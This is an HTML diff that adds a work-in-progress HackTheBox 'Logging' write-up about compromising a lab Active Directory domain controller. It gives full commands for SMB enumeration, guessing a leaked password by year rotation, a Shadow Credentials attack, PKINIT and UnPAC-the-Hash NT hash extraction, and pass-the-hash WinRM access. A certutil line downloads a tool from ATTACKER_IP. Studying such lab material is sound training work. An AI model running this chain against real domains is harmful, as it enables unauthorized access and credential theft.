@@ -6,77 +6,298 @@
     <title>Logging • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0d15;
-            color: #e0e5f0;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-        }
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background: rgba(12, 16, 28, 0.9);
-            border: 1px solid rgba(0, 255, 200, 0.15);
-            border-radius: 2rem;
-            padding: 3rem;
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
-        }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1rem;
-        }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
-            border-radius: 1rem;
-        }
-        .status i {
-            color: #ffcc00;
-            margin-right: 0.5rem;
-        }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
-            border-radius: 1rem;
-            color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
-        }
+        body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; white-space: pre; }
+        .todo-list { list-style-type: none; padding-left: 0; }
+        .todo-list li { padding: 0.5rem 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 0.5rem; margin-bottom: 0.5rem; border-left: 3px solid #ffcc00; }
+        .todo-list li::before { content: "⏳ "; color: #ffcc00; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Logging</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+<div class="container">
+    <div class="meta-info">
+        <span><strong>Status:</strong> Work in progress — user foothold achieved as <code>msa_health$</code>; root path under enumeration via <code>monitor.ps1</code>.</span>
     </div>
+    <div class="meta-info">
+        <span><strong>Target:</strong> TARGET_IP (10.129.41.161 at time of solve)</span>
+        <span><strong>Domain:</strong> logging.htb</span>
+        <span><strong>Hosts:</strong> DC01.logging.htb, wsus.logging.htb</span>
+        <span><strong>OS:</strong> Windows Server (Active Directory Domain Controller)</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Starting credentials:</strong> <code>wallace.everette / Welcome2026@</code></span>
+    </div>
+
+    <h1>Logging - HackTheBox Writeup</h1>
+
+    <h2>🗺️ Attack Chain Overview</h2>
+    <div class="attack-chain">Given creds: wallace.everette:Welcome2026@
+    
+SMB share enumeration → \Logs share readable
+    
+Log file leaks connection dump: svc_recovery:Em3rg3ncyPa$$2025  (expired)
+    
+Year-rotation guess → Em3rg3ncyPa$$2026 → valid TGT for svc_recovery
+    
+BloodHound as wallace.everette → svc_recovery has GenericWrite on msa_health$
+    
+Shadow Credentials attack (pywhisker) → PFX cert for msa_health$
+    
+PKINIT (gettgtpkinit) → TGT + AS-REP session key
+    
+UnPAC-the-Hash (getnthash) → NT hash for msa_health$
+    
+evil-winrm as msa_health$ → user foothold
+    
+[WIP] Local enum → monitor.ps1 → privilege escalation path
+    
+Administrator (pending)</div>
+
+    <h2>📋 Table of Contents</h2>
+    <ul>
+        <li><a href="#reconnaissance" style="color: #6fffe0;">1. Reconnaissance</a></li>
+        <li><a href="#environment-setup" style="color: #6fffe0;">2. Environment Setup</a></li>
+        <li><a href="#smb-enumeration" style="color: #6fffe0;">3. SMB Share Enumeration</a></li>
+        <li><a href="#credential-rotation" style="color: #6fffe0;">4. Credential Rotation Guess — svc_recovery</a></li>
+        <li><a href="#bloodhound" style="color: #6fffe0;">5. BloodHound — Finding the ACL Path</a></li>
+        <li><a href="#shadow-credentials" style="color: #6fffe0;">6. Shadow Credentials via pywhisker</a></li>
+        <li><a href="#pkinit" style="color: #6fffe0;">7. PKINIT + UnPAC-the-Hash</a></li>
+        <li><a href="#winrm" style="color: #6fffe0;">8. WinRM Foothold as msa_health$</a></li>
+        <li><a href="#local-enumeration" style="color: #6fffe0;">9. Local Enumeration (WIP)</a></li>
+        <li><a href="#key-takeaways" style="color: #6fffe0;">10. Key Takeaways</a></li>
+    </ul>
+
+    <h2 id="reconnaissance">🔍 1. Reconnaissance</h2>
+
+    <h3>Port Discovery</h3>
+    <pre><code>export TARGET=10.129.41.161
+nmap -sS -p- --min-rate 5000 -n $TARGET
+nmap -sVC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530 $TARGET -oA service-scan</code></pre>
+
+    <p>Standard DC footprint + <code>8530</code> (WSUS, hinting at <code>wsus.logging.htb</code>).</p>
+
+    <h2 id="environment-setup">⚙️ 2. Environment Setup</h2>
+
+    <h3>Hosts file</h3>
+    <pre><code>echo "$TARGET logging.htb DC01.logging.htb wsus.logging.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <h3>Kerberos time sync</h3>
+    <div class="box warning">
+        <p>Any Kerberos operation (TGT request, AS-REP, GetUserSPNs, getnthash) requires the clock to be within 5 minutes of the DC.</p>
+    </div>
+    <pre><code>sudo timedatectl set-ntp false
+sudo ntpdate -u $TARGET</code></pre>
+
+    <h2 id="smb-enumeration">📂 3. SMB Share Enumeration</h2>
+
+    <h3>List shares</h3>
+    <pre><code>crackmapexec smb $TARGET --shares -u 'wallace.everette' -p 'Welcome2026@'</code></pre>
+
+    <p>Standard AD shares plus a <strong><code>Logs</code></strong> custom share — always interesting on HTB.</p>
+
+    <h3>Explore NETLOGON for Configuration Artifacts</h3>
+    <pre><code>smbclient //$TARGET/NETLOGON -U wallace.everette%'Welcome2026@' -c 'recurse;ls'</code></pre>
+
+    <h3>Exfiltrate Sensitive Logs</h3>
+    <pre><code>smbclient //$TARGET/Logs -U wallace.everette%'Welcome2026@' -c 'recurse;ls'
+smbclient //$TARGET/Logs -U wallace.everette%'Welcome2026@'</code></pre>
+
+    <p>Inside one of the log files, a <strong>plaintext connection-context dump</strong> is present:</p>
+    <pre><code>[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: {
+  Domain: "logging.htb",
+  Server: "DC01",
+  SSL: "False",
+  BindUser: "LOGGING\svc_recovery",
+  BindPass: "Em3rg3ncyPa$$2025",
+  Timeout: 30
+}</code></pre>
+
+    <p>Two service accounts are implied: <code>svc_recovery</code> and — via the share naming — <code>msa_health</code> (a managed service account).</p>
+
+    <h2 id="credential-rotation">🔄 4. Credential Rotation Guess — svc_recovery</h2>
+
+    <h3>Test leaked creds</h3>
+    <pre><code>crackmapexec smb $TARGET -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025'</code></pre>
+
+    <p><strong>Result:</strong> <code>STATUS_ACCOUNT_RESTRICTION</code> — authentication fails. The password is either expired, forced to change, or the account is hour-restricted. The log is from 2026-02 referencing <code>Em3rg3ncyPa$$2025</code> — the <strong>password pattern is year-based</strong> and looks stale.</p>
+
+    <h3>Try next year in the rotation</h3>
+    <pre><code>impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'</code></pre>
+
+    <pre><code>[*] Saving ticket in svc_recovery.ccache</code></pre>
+
+    <div class="box success">
+        <p>The pattern held — password was rotated year-forward.</p>
+    </div>
+
+    <pre><code>export KRB5CCNAME=$(pwd)/svc_recovery.ccache
+klist</code></pre>
+
+    <h2 id="bloodhound">🩸 5. BloodHound — Finding the ACL Path</h2>
+
+    <h3>Collect the graph</h3>
+    <pre><code>bloodhound-python -u wallace.everette -p 'Welcome2026@' \
+  -d logging.htb -dc DC01.logging.htb -ns $TARGET -c All --zip</code></pre>
+
+    <p>Upload the zip to BloodHound and set <code>svc_recovery</code> as <strong>Owned</strong>.</p>
+
+    <h3>Key finding</h3>
+    <div class="box success">
+        <pre><code>svc_recovery → GenericWrite → MSA_HEALTH$</code></pre>
+    </div>
+
+    <p><code>GenericWrite</code> on a computer / MSA account enables two classic attacks:</p>
+    <ol>
+        <li><strong>Resource-Based Constrained Delegation (RBCD)</strong> — requires control of another account with an SPN.</li>
+        <li><strong>Shadow Credentials</strong> — write <code>msDS-KeyCredentialLink</code> and authenticate via PKINIT.</li>
+    </ol>
+
+    <p>The DC runs Windows 2016+ and supports PKINIT, so <strong>Shadow Credentials is the cleaner primitive</strong> here.</p>
+
+    <h2 id="shadow-credentials">🔑 6. Shadow Credentials via pywhisker</h2>
+
+    <h3>User enumeration (context)</h3>
+    <pre><code>crackmapexec smb $TARGET -u 'wallace.everette' -p 'Welcome2026@' --users
+rpcclient -U "logging.htb/wallace.everette%Welcome2026@" $TARGET -c "enumdomusers"</code></pre>
+
+    <p>Domain users observed:</p>
+    <pre><code>toby.brynleigh
+wallace.everette
+serina.philander
+wellington.kylan
+fable.milford
+kyson.abel
+monique.chip
+jaylee.clifton
+svc_recovery
+msa_health</code></pre>
+
+    <h3>Write the key credential on msa_health$</h3>
+    <pre><code>export KRB5CCNAME=$(pwd)/svc_recovery.ccache
+
+python3 pywhisker/pywhisker.py \
+  -d "logging.htb" \
+  -u "svc_recovery" --no-pass -k \
+  --target "msa_health$" \
+  --action "add" \
+  --dc-ip $TARGET</code></pre>
+
+    <p><strong>Output (sample):</strong></p>
+    <pre><code>[+] Certificate added: t9VbfvhY.pfx
+[+] PFX password: Z7teStyyJxhoRZR6tGDd</code></pre>
+
+    <p>The <code>msDS-KeyCredentialLink</code> property on <code>MSA_HEALTH$</code> now contains our public key — we can authenticate as that account using the PFX.</p>
+
+    <h2 id="pkinit">🔐 7. PKINIT + UnPAC-the-Hash</h2>
+
+    <h3>Request a TGT with the certificate</h3>
+    <pre><code>python3 gettgtpkinit.py \
+  -cert-pfx ../pywhisker/t9VbfvhY.pfx \
+  -pfx-pass 'Z7teStyyJxhoRZR6tGDd' \
+  logging.htb/msa_health\$ msa_health.ccache</code></pre>
+
+    <p>The tool also prints the <strong>AS-REP session key</strong> — keep it, we need it to decrypt the PAC and reveal the NT hash.</p>
+    <pre><code>AS-REP encryption key:
+b0fed55e745ae9ffbba885d0cd7db34a16fb565a26ca1967c90b3968a7b7f0a6</code></pre>
+
+    <pre><code>klist -c msa_health.ccache
+export KRB5CCNAME=$(pwd)/msa_health.ccache</code></pre>
+
+    <h3>UnPAC the hash</h3>
+    <pre><code>python3 getnthash.py \
+  -key 'b0fed55e745ae9ffbba885d0cd7db34a16fb565a26ca1967c90b3968a7b7f0a6' \
+  -dc-ip $TARGET logging.htb/msa_health\$</code></pre>
+
+    <p><strong>Recovered:</strong></p>
+    <pre><code>NT Hash: 603fc24ee01a9409f83c9d1d701485c5</code></pre>
+
+    <div class="box warning">
+        <p><strong>Why this works:</strong> <code>gettgtpkinit</code> authenticates with a certificate and receives a TGT. The TGT includes a PAC encrypted with the AS-REP session key, and the PAC carries the account's NTLM credentials. <code>getnthash</code> decrypts the PAC and extracts the NT hash — giving us a credential usable with NTLM, PTH, WinRM, SMB, etc.</p>
+    </div>
+
+    <h2 id="winrm">🖥️ 8. WinRM Foothold as msa_health$</h2>
+    <pre><code>evil-winrm -i $TARGET -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'</code></pre>
+
+    <p>Verify:</p>
+    <pre><code>*Evil-WinRM* PS> whoami
+logging\msa_health$</code></pre>
+
+    <h2 id="local-enumeration">🔍 9. Local Enumeration (WIP)</h2>
+
+    <h3>Transfer WinPEAS</h3>
+    <pre><code>sudo python3 -m http.server 80</code></pre>
+
+    <pre><code>certutil -urlcache -f http://&lt;ATTACKER_IP&gt;:80/winPEAS.ps1 winPEAS.ps1
+.\winPEAS.ps1 > resultados.txt 2>&1</code></pre>
+
+    <h3>Interesting artefact — <code>monitor.ps1</code></h3>
+    <pre><code>Get-ChildItem monitor.ps1 | Format-List Name, LastWriteTime, CreationTime, LastAccessTime
+Get-Content monitor.ps1
+Get-Acl monitor.ps1 | Format-List</code></pre>
+
+    <div class="box warning">
+        <p><strong>Pending:</strong> identify <em>who</em> runs <code>monitor.ps1</code>, <em>how often</em> (scheduled task / service), and <em>whether</em> the running account is <code>msa_health$</code> or a higher-privileged principal. If it runs as Administrator / SYSTEM and is writable by <code>msa_health$</code>, writing payload code into it yields privilege escalation.</p>
+        <p>This section will be expanded once root is reached.</p>
+    </div>
+
+    <h2 id="key-takeaways">🧠 10. Key Takeaways (current)</h2>
+    <table>
+        <tr><th>Stage</th><th>Technique</th><th>Key Detail</th></tr>
+        <tr><td><strong>Share Triage</strong></td><td>SMB share enum with provided creds</td><td>Custom <code>\Logs</code> share leaked service-account context</td></tr>
+        <tr><td><strong>Credential Pivot</strong></td><td>Year-rotation password guess</td><td><code>Em3rg3ncyPa$$2025</code> → <code>Em3rg3ncyPa$$2026</code> worked</td></tr>
+        <tr><td><strong>Graph Analysis</strong></td><td>BloodHound (<code>bloodhound-python</code>)</td><td>Exposed <code>GenericWrite</code> from <code>svc_recovery</code> onto <code>msa_health$</code></td></tr>
+        <tr><td><strong>ACL Abuse</strong></td><td>Shadow Credentials (pywhisker)</td><td>Wrote <code>msDS-KeyCredentialLink</code> to MSA account</td></tr>
+        <tr><td><strong>Auth Upgrade</strong></td><td>PKINIT → UnPAC-the-Hash</td><td>Extracted NT hash from AS-REP-encrypted PAC</td></tr>
+        <tr><td><strong>Foothold</strong></td><td><code>evil-winrm -H</code> (PTH over WinRM)</td><td>Shell as <code>msa_health$</code></td></tr>
+        <tr><td><strong>Root</strong></td><td><em>Pending — <code>monitor.ps1</code> path</em></td><td>Active enumeration</td></tr>
+    </table>
+
+    <h3>Lessons so far</h3>
+    <ul>
+        <li><strong>Never log credentials.</strong> Verbose application logs dumping bind passwords are a recurring AD bootstrap vector.</li>
+        <li><strong>Rotate by secret, not by rule.</strong> Year-suffixed passwords leak the rotation logic as soon as one historical secret escapes.</li>
+        <li><strong>ACLs beat passwords.</strong> A single <code>GenericWrite</code> over an MSA, combined with PKINIT support, is a full authentication bypass.</li>
+        <li><strong>Protect <code>msDS-KeyCredentialLink</code>.</strong> Monitor writes to this attribute — Shadow Credentials shows up loudly in event 5136 with the right SACL.</li>
+    </ul>
+
+    <h3>Related Notes</h3>
+    <ul>
+        <li><a href="../../../tools/recon/netexec.md" style="color: #6fffe0;">netexec / crackmapexec</a> — SMB bind and share listing</li>
+        <li><a href="../../../tools/windows/impacket.md" style="color: #6fffe0;">impacket</a> — <code>getTGT</code></li>
+        <li><a href="../../../tools/windows/evil-winrm.md" style="color: #6fffe0;">evil-winrm</a> — WinRM with hash auth</li>
+        <li><a href="../../../exploits/ad/kerberos-roasting.md" style="color: #6fffe0;">Kerberos roasting notes</a> (for related AD ticketing)</li>
+        <li><em>TODO</em>: dedicated <code>exploits/shadow-credentials.md</code> covering pywhisker + PKINIT + UnPAC workflow</li>
+    </ul>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
 </body>
 </html>
